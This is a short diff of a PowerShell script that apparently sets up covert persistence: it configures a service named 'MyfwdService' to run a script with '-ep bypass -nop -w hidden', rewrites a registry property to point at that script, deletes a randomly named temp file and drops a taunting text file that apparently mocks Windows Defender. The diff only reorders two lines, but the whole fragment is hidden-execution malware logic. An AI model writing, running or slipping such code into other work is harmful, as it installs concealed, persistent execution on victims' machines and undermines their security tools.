@@ -90,9 +90,9 @@ while ($true) {
             $fwdPath = $it.$propertyName
         }
         $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
-        Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
         $arg = "-ep bypass -nop -w hidden $fwdPath"
         & $exe set "MyfwdService" AppParameters $arg
+        Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
         Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
         echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
     }
